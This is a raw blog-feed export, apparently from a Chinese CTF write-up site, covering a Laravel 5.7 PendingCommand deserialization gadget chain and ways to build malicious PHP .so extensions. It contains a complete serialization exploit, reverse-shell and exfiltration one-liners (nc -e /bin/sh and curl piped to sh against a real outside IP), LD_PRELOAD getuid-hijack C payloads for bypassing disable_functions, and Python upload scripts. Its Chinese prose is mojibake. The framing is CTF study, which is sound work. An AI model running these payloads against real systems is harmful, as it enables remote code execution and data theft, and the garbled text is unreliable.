&#125;&#125;namespace Illuminate\Foundation&#123;    class Application    &#123;        protected $bindings &#x3D; [];        public function __construct()&#123;            $this-&gt;bindings&#x3D;array(&#39;Illuminate\Contracts\Console\Kernel&#39;&#x3D;&gt;array(&#39;concrete&#39;&#x3D;&gt;&#39;Illuminate\Foundation\Application&#39;));        &#125;    &#125;&#125;namespace Illuminate\Auth&#123;    class GenericUser    &#123;        protected $attributes;        public function __construct()        &#123;            $this-&gt;attributes[&#39;expectedOutput&#39;]&#x3D;[&#39;w1nd&#39;,&#39;w1nd&#39;];            $this-&gt;attributes[&#39;expectedQuestions&#39;]&#x3D;[&#39;w1nd&#39;,&#39;w1nd&#39;];        &#125;    &#125;&#125;namespace &#123;    use Illuminate\Foundation\Testing\PendingCommand;    echo urlencode(serialize(new PendingCommand()));&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åˆ†æåˆ°ä¸Šé¢å…¶å®å°±å·²ç»èƒ½å¤Ÿå‘½ä»¤æ‰§è¡Œäº†ï¼Œå› ä¸ºåé¢çš„è¯­å¥å¤§æ¦‚éƒ½æ²¡ä»€ä¹ˆå½±å“ï¼Œifåº”è¯¥éƒ½è¿›ä¸å»å•¥çš„ã€‚ä½†è¿˜æ˜¯ç»§ç»­åˆ†æä¸€ä¸‹ï¼Œæœ‰å§‹æœ‰ç»ˆã€‚</p><p>è¿”å›concreteçš„å€¼åï¼Œæ¥åˆ°äº†ä¸‹é¢çš„è¯­å¥ï¼š</p><pre class="line-numbers language-none"><code class="language-none">if ($this-&gt;isBuildable($concrete, $abstract)) &#123;            $object &#x3D; $this-&gt;build($concrete);        &#125; else &#123;            $object &#x3D; $this-&gt;make($concrete);        &#125;&#x2F;&#x2F;æ— æ³•è¿›è¡ŒisBuildableï¼Œä¼šå†æ¬¡makeï¼Œç„¶åresolveï¼Œç„¶ågetConcreteï¼Œå› ä¸ºthis-&gt;bindings[&#39;Illuminate\Foundation\Application&#39;]ä¸å­˜åœ¨æ‰€ä»¥ç›´æ¥è¿”å›äº†[&#39;Illuminate\Foundation\Application&#39;]ï¼Œç„¶åæ»¡è¶³isBuildableï¼Œè¿›å…¥buildå‡½æ•°<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>buildå‡½æ•°å¦‚ä¸‹ï¼Œç”±æ³¨é‡Šå’Œ<code>$reflector = new ReflectionClass($concrete);</code>å¯ä»¥çœ‹å‡ºè¿™ä¸ªå‡½æ•°åå°„å®ä¾‹åŒ–äº†ä¸€ä¸ªå¯¹è±¡ï¼Œæ‰€ä»¥æœ€åè¿”å›äº†ä¸€ä¸ª<code>Illuminate\Foundation\Application</code>å¯¹è±¡ï¼š</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;**     * Instantiate a concrete instance of the given type.     *     * @param  string  $concrete     * @return mixed     *     * @throws \Illuminate\Contracts\Container\BindingResolutionException     *&#x2F;    public function build($concrete)    &#123;        &#x2F;&#x2F; If the concrete type is actually a Closure, we will just execute it and        &#x2F;&#x2F; hand back the results of the functions, which allows functions to be        &#x2F;&#x2F; used as resolvers for more fine-tuned resolution of these objects.        if ($concrete instanceof Closure) &#123;            return $concrete($this, $this-&gt;getLastParameterOverride());        &#125;        $reflector &#x3D; new ReflectionClass($concrete);        &#x2F;&#x2F; If the type is not instantiable, the developer is attempting to resolve        &#x2F;&#x2F; an abstract type such as an Interface or Abstract Class and there is        &#x2F;&#x2F; no binding registered for the abstractions so we need to bail out.        if (! $reflector-&gt;isInstantiable()) &#123;            return $this-&gt;notInstantiable($concrete);        &#125;        $this-&gt;buildStack[] &#x3D; $concrete;        $constructor &#x3D; $reflector-&gt;getConstructor();        &#x2F;&#x2F; If there are no constructors, that means there are no dependencies then        &#x2F;&#x2F; we can just resolve the instances of the objects right away, without        &#x2F;&#x2F; resolving any other types or dependencies out of these containers.        if (is_null($constructor)) &#123;            array_pop($this-&gt;buildStack);            return new $concrete;        &#125;        $dependencies &#x3D; $constructor-&gt;getParameters();        &#x2F;&#x2F; Once we have all the constructor&#39;s parameters we can create each of the        &#x2F;&#x2F; dependency instances and then use the reflection instances to make a        &#x2F;&#x2F; new instance of this class, injecting the created dependencies in.        $instances &#x3D; $this-&gt;resolveDependencies(            $dependencies        );        array_pop($this-&gt;buildStack);        return $reflector-&gt;newInstanceArgs($instances);    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿”å›æ¥ä¹‹åï¼Œå°±Applicationä¼šè°ƒç”¨callå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°æ˜¯ç»§æ‰¿æ¥è‡ªContainerçš„</p><pre class="line-numbers language-none"><code class="language-none">public function call($callback, array $parameters &#x3D; [], $defaultMethod &#x3D; null)    &#123;        return BoundMethod::call($this, $callback, $parameters, $defaultMethod);    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æ¥åˆ°BoundMethod::callï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªcall_user_func_arrayç»å…¸çš„è°ƒç”¨å‡½æ•°è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œè¿™ä¸ªåº”è¯¥å°±æ˜¯æœ€åçš„åœ°æ–¹äº†ã€‚</p><pre class="line-numbers language-none"><code class="language-none">public static function call($container, $callback, array $parameters &#x3D; [], $defaultMethod &#x3D; null)    &#123;        if (static::isCallableWithAtSign($callback) || $defaultMethod) &#123;            return static::callClass($container, $callback, $parameters, $defaultMethod);        &#125;        return static::callBoundMethod($container, $callback, function () use ($container, $callback, $parameters) &#123;            return call_user_func_array(                $callback, static::getMethodDependencies($container, $callback, $parameters)            );        &#125;);    &#125;&#x2F;&#x2F;æ‰“æ–­ç‚¹çŸ¥é“ç¬¬ä¸€ä¸ªifè¿›ä¸å»ï¼Œç„¶åç›´æ¥è¿›è¡Œç¬¬äºŒä¸ªreturnï¼Œæ³¨æ„åˆ°æœ‰ä¸€ä¸ªcall_user_func_array<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è·Ÿå…¥åˆ°getMethodDependenciesï¼š</p><pre class="line-numbers language-none"><code class="language-none">protected static function getMethodDependencies($container, $callback, array $parameters &#x3D; [])    &#123;        $dependencies &#x3D; [];        foreach (static::getCallReflector($callback)-&gt;getParameters() as $parameter) &#123;            static::addDependencyForCallParameter($container, $parameter, $parameters, $dependencies);        &#125;        return array_merge($dependencies, $parameters);    &#125;&#x2F;&#x2F;è¿™é‡Œarray_mergeè¿›è¡Œäº†ä¸€ä¸ªæ•°ç»„çš„åˆå¹¶ï¼Œæ²¡æœ‰ä»€ä¹ˆå½±å“ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¤§æ¦‚åˆ°è¿™é‡Œæ•´ä¸ªé“¾å­å°±åˆ†æå®Œæ¯•äº†ï¼Œç›¸å½“äºæœ€åæ‰§è¡Œäº†ä¸€ä¸ª<code>call_user_func_array(&#39;system&#39;,array(0=&gt;&#39;dir));</code></p><p>æœ€ç»ˆserialize.phpä»£ç :</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpnamespace Illuminate\Foundation\Testing&#123;    use Illuminate\Auth\GenericUser;    use Illuminate\Foundation\Application;    class PendingCommand    &#123;        protected $command;        protected $parameters;        public $test;        protected $app;        public function __construct()&#123;            $this-&gt;command&#x3D;&#39;system&#39;;            $this-&gt;parameters[]&#x3D;&#39;dir&#39;;            $this-&gt;test&#x3D;new GenericUser();            $this-&gt;app&#x3D;new Application();        &#125;    &#125;&#125;namespace Illuminate\Foundation&#123;    class Application    &#123;        protected $bindings &#x3D; [];        public function __construct()&#123;            $this-&gt;bindings&#x3D;array(&#39;Illuminate\Contracts\Console\Kernel&#39;&#x3D;&gt;array(&#39;concrete&#39;&#x3D;&gt;&#39;Illuminate\Foundation\Application&#39;));        &#125;    &#125;&#125;namespace Illuminate\Auth&#123;    class GenericUser    &#123;        protected $attributes;        public function __construct()        &#123;            $this-&gt;attributes[&#39;expectedOutput&#39;]&#x3D;[&#39;w1nd&#39;,&#39;w1nd&#39;];            $this-&gt;attributes[&#39;expectedQuestions&#39;]&#x3D;[&#39;w1nd&#39;,&#39;w1nd&#39;];        &#125;    &#125;&#125;namespace &#123;    use Illuminate\Foundation\Testing\PendingCommand;    echo urlencode(serialize(new PendingCommand()));&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>æœ¬æ¬¡è¿˜æ˜¯å­¦åˆ°äº†ç‚¹ä¸œè¥¿çš„ï¼Œå…³äºlaravelæ¡†æ¶ä¹ŸåŸºæœ¬ä¸Šæœ‰ä¸€å®šçš„äº†è§£äº†ï¼Œè·Ÿç€å¤§å¸ˆå‚…çš„åšå®¢æ…¢æ…¢åˆ†æäº†5.7çš„ä¸€ä¸ªå…³äºPendingCommandçš„ååºåˆ—åŒ–æ¼æ´ç‚¹ï¼Œå­¦ä¹ åˆ°äº†ã€‚ç»§ç»­åŠ æ²¹å§ï¼</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> laravel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>èŠ±å¼æ„é€ æ¶æ„soæ–‡ä»¶</title>
      <link href="/2022/04/28/hua-shi-gou-zao-e-yi-so-wen-jian/"/>
      <url>/2022/04/28/hua-shi-gou-zao-e-yi-so-wen-jian/</url>
      
        <content type="html"><![CDATA[<h3 id="åŠ«æŒmysqli"><a href="#åŠ«æŒmysqli" class="headerlink" title="åŠ«æŒmysqli"></a>åŠ«æŒmysqli</h3><h4 id="æ¼æ´ä»£ç "><a href="#æ¼æ´ä»£ç " class="headerlink" title="æ¼æ´ä»£ç "></a>æ¼æ´ä»£ç </h4><pre class="line-numbers language-none"><code class="language-none"> &lt;?phperror_reporting(0);$action &#x3D; $_GET[&#39;a&#39;];switch ($action) &#123;    case &#39;phpinfo&#39;:        phpinfo();        break;    case &#39;write&#39;:        file_put_contents($_POST[&#39;file&#39;],$_POST[&#39;content&#39;]);        break;    case &#39;run&#39;:        shell_exec(&quot;php -r &#39;ctfshow();&#39;&quot;);        break;    default:        highlight_file(__FILE__);        break;&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰©å±•ç›®å½•</p><p><img src="/images/so/extension.png" class="lazyload placeholder" data-srcset="/images/so/extension.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p><p>&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;extensions&#x2F;no-debug-non-zts-20180731</p><h4 id="æ¡ä»¶åˆ†æ"><a href="#æ¡ä»¶åˆ†æ" class="headerlink" title="æ¡ä»¶åˆ†æ"></a>æ¡ä»¶åˆ†æ</h4><p><img src="/images/so/condition.png" class="lazyload placeholder" data-srcset="/images/so/condition.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p><h3 id="1-çº¯æ‰‹åŠ¨æ„é€ so"><a href="#1-çº¯æ‰‹åŠ¨æ„é€ so" class="headerlink" title="1 çº¯æ‰‹åŠ¨æ„é€ so"></a>1 çº¯æ‰‹åŠ¨æ„é€ so</h3><p>æœ‰æ—¶é—´å†è¡¥å……</p><h3 id="2-ä½¿ç”¨ext-skel"><a href="#2-ä½¿ç”¨ext-skel" class="headerlink" title="2 ä½¿ç”¨ext_skel"></a>2 ä½¿ç”¨ext_skel</h3><p>å…¶ä¸­cæ–‡ä»¶æœ‰ä¿®æ”¹çš„åœ°æ–¹</p><p><img src="/images/so/change.png" class="lazyload placeholder" data-srcset="/images/so/change.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p><p>apt-get install å®‰è£…çš„phpæ˜¯æ²¡æœ‰ext_skel.phpçš„,éœ€è¦è‡ªå·±å»ä¸‹è½½æºç åŒ…</p><p><img src="/images/so/ext_skel.png" class="lazyload placeholder" data-srcset="/images/so/ext_skel.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p><pre class="line-numbers language-none"><code class="language-none">wget http:&#x2F;&#x2F;fi2.php.net&#x2F;get&#x2F;php-7.1.11.tar.gz&#x2F;from&#x2F;this&#x2F;mirrortar -zxvf php-7.0.2.tar.gzå®‰è£…ï¼š.&#x2F;configure --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;phpmakemake install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é¦–å…ˆç”Ÿæˆä¸€ä¸ªå‡çš„mysqliæ‰©å±•</p><pre class="line-numbers language-none"><code class="language-none">php ext_skel.php --ext mysqli --author w1nd --stdphp ext_skel.php --ext ctfshow --author w1nd --std<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è¿›å…¥è¯¥ç›®å½•æ‰¾åˆ°cæ–‡ä»¶åœ¨test1å¤„åŠ å…¥åå¼¹shellçš„ä»£ç </p><pre class="line-numbers language-none"><code class="language-none">nc 175.178.47.228 8888 -e &#x2F;bin&#x2F;shcurl https:&#x2F;&#x2F;your-shell.com&#x2F;175.178.47.228:8888 | shcurl http:&#x2F;&#x2F;175.178.47.228:8888&#x2F;?p&#x3D;&#96;cat &#x2F;*&#96;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>è¿˜æœ‰æ”¹å˜çš„åœ°æ–¹</p><p><img src="/images/so/so-change.png" class="lazyload placeholder" data-srcset="/images/so/so-change.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p><p>å†™å‡ºæ¥å…ˆï¼š</p><pre class="line-numbers language-none"><code class="language-none">ç¬¬ä¸€ä¸ªåœ°æ–¹æ˜¯PHP_FUNCTIONå‡½æ•°é‚£é‡Œå†™å…¥è‡ªå·±éœ€è¦æ‰§è¡Œçš„å‘½ä»¤ç¬¬äºŒä¸ªåœ°æ–¹æ˜¯ä¸‹é¢è¿™ä¸ª:static const zend_function_entry ctfshow_functions[] &#x3D; &#123;        PHP_FE(ctfshow,         arginfo_mysqli_test1)        PHP_FE(mysqli_test2,           arginfo_mysqli_test2)        PHP_FE_END&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶å</p><pre class="line-numbers language-none"><code class="language-none">phpize.&#x2F;configure --enable-mysqlimakemake installç‰¹æ„è¯´æ˜ï¼Œæœ€å¥½ä½¿ç”¨è·Ÿé¢˜ç›®çš„åŒä¸€ç‰ˆæœ¬ï¼Œä¸åŒå¤§ç‰ˆæœ¬ä¹‹é—´æœ‰å·®å¼‚æ€§ï¼Œæ‰€ä»¥å¯èƒ½æ‰“ä¸é€šã€‚ä¾‹å¦‚ä¸‹é¢çš„ä½¿ç”¨æ–¹å¼ï¼š&#x2F;etc&#x2F;php&#x2F;8.0.9&#x2F;bin&#x2F;phpize       &#x2F;&#x2F;æ³¨æ„ä½¿ç”¨æŒ‡å®šç‰ˆæœ¬çš„phpize,å¦‚æœä½¿ç”¨è¿‡å…¶ä»–ç‰ˆæœ¬çš„phpize,è®°ä½æ¸…ç©ºæ—§ç‰ˆæœ¬çš„æ®‹ä½™.&#x2F;configure --with-php-config&#x3D;&#x2F;etc&#x2F;php&#x2F;8.0.9&#x2F;bin&#x2F;php-config    &#x2F;&#x2F;åŒæ ·æŒ‡å®šç‰ˆæœ¬çš„php-configmakesudo make install   &#x2F;&#x2F;å®‰è£…åˆ°æŒ‡å®šç‰ˆæœ¬çš„soç›®å½•ä¸‹<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åä¼šå‘Šè¯‰ç”Ÿæˆçš„soæ–‡ä»¶æ‰€åœ¨ç›®å½•ï¼š</p><pre class="line-numbers language-none"><code class="language-none">Installing shared extensions:     &#x2F;usr&#x2F;lib&#x2F;php&#x2F;20210902&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>pythonè„šæœ¬è·‘ä¸€ä¸‹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">import requests  url&#x3D;&quot;http:&#x2F;&#x2F;7d007399-e8e6-4dd9-947f-4ad7a8456559.challenge.ctf.show&#x2F;&quot;sodata&#x3D;open(&quot;mysqli.so&quot;, &#39;rb&#39;).read()# æ‰©å±•ç›®å½•å¯ä»¥åœ¨phpinfoä¸­çœ‹åˆ°data &#x3D; &#123;    &#39;file&#39;: &#39;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;extensions&#x2F;no-debug-non-zts-20180731&#x2F;mysqli.so&#39;,    &#39;content&#39;: sodata&#125;requests.post(url+&quot;?a&#x3D;write&quot;,data&#x3D;data)requests.get(url+&quot;?a&#x3D;run&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-gcc"><a href="#3-gcc" class="headerlink" title="3 gcc"></a>3 gcc</h3><p>å…ˆå†™ä¸€ä¸ªcæ–‡ä»¶</p><pre class="line-numbers language-none"><code class="language-none">#include&lt;stdlib.h&gt;#include&lt;string.h&gt;__attribute__((constructor))void payload()&#123;unserenv(&quot;LD_PRELOAD&quot;);const char* cmd &#x3D; getenv(&quot;CMD&quot;);    system(cmd);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åç›´æ¥gccç”Ÿæˆå…±äº«åº“</p><pre class="line-numbers language-none"><code class="language-none">gcc -c -fPIC a.c -o hack&amp;&amp;gcc --share hack -o hack.sogcc -c -fPIC exp.c -o exp &amp;&amp; gcc -shared exp -o exp.so<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="åˆ©ç”¨LD-PRELOADåŠ«æŒgetuidå‡½æ•°"><a href="#åˆ©ç”¨LD-PRELOADåŠ«æŒgetuidå‡½æ•°" class="headerlink" title="åˆ©ç”¨LD_PRELOADåŠ«æŒgetuidå‡½æ•°"></a>åˆ©ç”¨LD_PRELOADåŠ«æŒgetuidå‡½æ•°</h3><p>ä¸Šé¢çš„æ–¹æ³•ï¼Œéœ€è¦é‡å¯æˆ–è€…å‘½ä»¤è¡Œæ¥æ‰§è¡Œphpé‡è½½soæ–‡ä»¶ï¼Œåˆ©ç”¨æ¡ä»¶è‹›åˆ»ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å¯»æ‰¾åˆ°ä¸é‡å¯php-fpmçš„æ–¹æ³•ã€‚</p><h4 id="æ¼æ´ä»£ç -1"><a href="#æ¼æ´ä»£ç -1" class="headerlink" title="æ¼æ´ä»£ç "></a>æ¼æ´ä»£ç </h4><pre class="line-numbers language-none"><code class="language-none"> &lt;?phperror_reporting(0);$action &#x3D; $_GET[&#39;a&#39;];switch ($action) &#123;    case &#39;phpinfo&#39;:        phpinfo();        break;    case &#39;write&#39;:        file_put_contents($_POST[&#39;file&#39;],$_POST[&#39;content&#39;]);        break;    case &#39;run&#39;:        putenv($_GET[&#39;env&#39;]);        system(&quot;whoami&quot;);        break;    default:        highlight_file(__FILE__);        break;&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¦‚æœæ‰©å±•ç›®å½•ä¸å¯å†™ï¼Œä¸”æ— æ³•é‡å¯php-fpmï¼Œå°±éœ€è¦ä½¿ç”¨åˆ°putenvå‡½æ•°æ¥å®ç°æ‰§è¡Œæ¶æ„soæ–‡ä»¶</p><h4 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h4><p><img src="/images/so/getuid.png" class="lazyload placeholder" data-srcset="/images/so/getuid.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p><p>å¤§æ¦‚æ„æ€å°±æ˜¯ï¼šphpè°ƒç”¨mailå‡½æ•°åï¼Œä¼šè°ƒç”¨linuxä¸‹çš„&#x2F;usr&#x2F;bin&#x2F;sendemailï¼Œåˆ›å»ºä¸€ä¸ªæ–°çš„è¿›ç¨‹ï¼Œå»ºäº†æ–°çš„è¿›ç¨‹å°±ä¼šè°ƒç”¨getuidå‡½æ•°ï¼Œæ‰€ä»¥åªè¦æˆ‘ä»¬é€šè¿‡è®¾ç½®ç»§æ‰¿LD_PRELOADç¯å¢ƒå˜é‡æå‰åŠ è½½æ¶æ„çš„soæ–‡ä»¶ï¼Œé‚£ä¹ˆæ–°å»ºè¿›ç¨‹çš„æ—¶å€™å°±ä¼šæ‰§è¡Œæ¶æ„soæ–‡ä»¶ä¸­çš„getuidè¿™ä¸ªæ¶æ„çš„å‡½æ•°ä»£ç ã€‚</p><h4 id="æƒ³è¦åˆ©ç”¨LD-PRELOADç¯å¢ƒå˜é‡ç»•è¿‡disable-functionséœ€è¦æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š"><a href="#æƒ³è¦åˆ©ç”¨LD-PRELOADç¯å¢ƒå˜é‡ç»•è¿‡disable-functionséœ€è¦æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š" class="headerlink" title="æƒ³è¦åˆ©ç”¨LD_PRELOADç¯å¢ƒå˜é‡ç»•è¿‡disable_functionséœ€è¦æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š"></a>æƒ³è¦åˆ©ç”¨LD_PRELOADç¯å¢ƒå˜é‡ç»•è¿‡disable_functionséœ€è¦æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š</h4><blockquote><p>èƒ½å¤Ÿä¸Šä¼ è‡ªå·±çš„.soæ–‡ä»¶</p><p>èƒ½å¤Ÿæ§åˆ¶LD_PRELOADç¯å¢ƒå˜é‡çš„å€¼ï¼Œæ¯”å¦‚putenv()å‡½æ•°</p><p>å› ä¸ºæ–°è¿›ç¨‹å¯åŠ¨å°†åŠ è½½LD_PRELOADä¸­çš„.soæ–‡ä»¶ï¼Œæ‰€ä»¥è¦å­˜åœ¨å¯ä»¥æ§åˆ¶PHPå¯åŠ¨å¤–éƒ¨ç¨‹åºçš„å‡½æ•°å¹¶èƒ½æ‰§è¡Œï¼Œæ¯”å¦‚mail()ã€imap_mail()ã€mb_send_mail()å’Œerror_log()å‡½æ•°ç­‰</p></blockquote><h4 id="getuid"><a href="#getuid" class="headerlink" title="getuid"></a>getuid</h4><p>å‡½æ•°åŸå‹ï¼š</p><p><img src="/images/so/getuid-function.png" class="lazyload placeholder" data-srcset="/images/so/getuid-function.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p><p>é‡å†™å,ç¬¬ä¸€ç§æ–¹å¼ï¼š</p><p><img src="/images/so/getuid-change.png" class="lazyload placeholder" data-srcset="/images/so/getuid-change.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p><p>ä¹Ÿå¯ä»¥å†™æˆä¸‹é¢è¿™ç§ï¼š</p><p>getuid.c</p><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void payload()&#123;        &#x2F;&#x2F;system(&quot;curl http:&#x2F;&#x2F;175.178.47.228:8888?s&#x3D;&#96;cat &#x2F;*&#96;&quot;);        system(&quot;curl https:&#x2F;&#x2F;your-shell.com&#x2F;175.178.47.228:8888 | sh&quot;);&#125;int getuid()&#123;        if(getenv(&quot;LD_PRELOAD&quot;)&#x3D;&#x3D;NULL)&#123; return 0;&#125;        unsetenv(&quot;LD_PRELOAD&quot;);        payload();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½¿ç”¨ä¸‹é¢è¯­å¥gccç¼–è¯‘ä¸Šé¢çš„cæ–‡ä»¶ç”Ÿæˆæ¶æ„soæ–‡ä»¶</p><pre class="line-numbers language-none"><code class="language-none">gcc -c -fPIC getuid.c -o getuidgcc --share getuid -o getuid.soæˆ–è€…gcc -c -fPIC getuid.c -o getuid&amp;&amp;gcc --share getuid -o getuid.so<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åä½¿ç”¨pythonè„šæœ¬è·‘é¢˜ç›®åå¼¹shellï¼š</p><pre class="line-numbers language-none"><code class="language-none">import requestsurl&#x3D;&quot;http:&#x2F;&#x2F;690602f6-e0b4-4a2b-b0e0-b36c4e383275.challenge.ctf.show&#x2F;&quot;data&#x3D;&#123;&#39;file&#39;:&#39;&#x2F;tmp&#x2F;hack.so&#39;,&#39;content&#39;:open(&#39;hack.so&#39;,&#39;rb&#39;).read()&#125;requests.post(url+&#39;?a&#x3D;write&#39;,data&#x3D;data)requests.get(url+&#39;?a&#x3D;run&amp;env&#x3D;LD_PRELOAD&#x3D;&#x2F;tmp&#x2F;hack.so&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="è¡¥å……-PHPä¼šäº§ç”Ÿè¿›ç¨‹çš„ä¸€äº›å‡½æ•°"><a href="#è¡¥å……-PHPä¼šäº§ç”Ÿè¿›ç¨‹çš„ä¸€äº›å‡½æ•°" class="headerlink" title="è¡¥å……-PHPä¼šäº§ç”Ÿè¿›ç¨‹çš„ä¸€äº›å‡½æ•°"></a>è¡¥å……-PHPä¼šäº§ç”Ÿè¿›ç¨‹çš„ä¸€äº›å‡½æ•°</h3><p><img src="/images/so/function-process.png" class="lazyload placeholder" data-srcset="/images/so/function-process.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p><h3 id="åˆ©ç”¨LD-PRELOADåŠ«æŒæ„é€ å‡½æ•°ï¼ˆä¸ä¸Šæ–¹getuidä¸åŒï¼Œè¿™ä¸ªé€šæ€ï¼‰"><a href="#åˆ©ç”¨LD-PRELOADåŠ«æŒæ„é€ å‡½æ•°ï¼ˆä¸ä¸Šæ–¹getuidä¸åŒï¼Œè¿™ä¸ªé€šæ€ï¼‰" class="headerlink" title="åˆ©ç”¨LD_PRELOADåŠ«æŒæ„é€ å‡½æ•°ï¼ˆä¸ä¸Šæ–¹getuidä¸åŒï¼Œè¿™ä¸ªé€šæ€ï¼‰"></a>åˆ©ç”¨LD_PRELOADåŠ«æŒæ„é€ å‡½æ•°ï¼ˆä¸ä¸Šæ–¹getuidä¸åŒï¼Œè¿™ä¸ªé€šæ€ï¼‰</h3><p>å¦‚æœåä¸ªé¢˜ç›®åä¸ªä¸åŒçš„å‡½æ•°ï¼Œé‚£ä¹ˆå°±è¦æ„é€ åä¸ªä¸åŒçš„æ¶æ„soæ–‡ä»¶æ¥åŠ«æŒï¼Œæ‰€ä»¥æ€è€ƒæœ‰æ²¡æœ‰ä¸€ç§æ–¹æ³•å¯ä»¥æ„é€ ä¸€ç§æ¶æ„soæ–‡ä»¶å°±èƒ½é€šæ€æ‰€æœ‰å‡½æ•°ã€‚</p><h4 id="æ¼æ´ä»£ç -2"><a href="#æ¼æ´ä»£ç -2" class="headerlink" title="æ¼æ´ä»£ç "></a>æ¼æ´ä»£ç </h4><pre class="line-numbers language-none"><code class="language-none"> &lt;?phperror_reporting(0);$action &#x3D; $_GET[&#39;a&#39;];switch ($action) &#123;    case &#39;phpinfo&#39;:        phpinfo();        break;        case &#39;write&#39;:        file_put_contents($_POST[&#39;file&#39;],$_POST[&#39;content&#39;]);        break;    case &#39;run&#39;:        putenv($_GET[&#39;env&#39;]);        mail(&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);        break;    default:        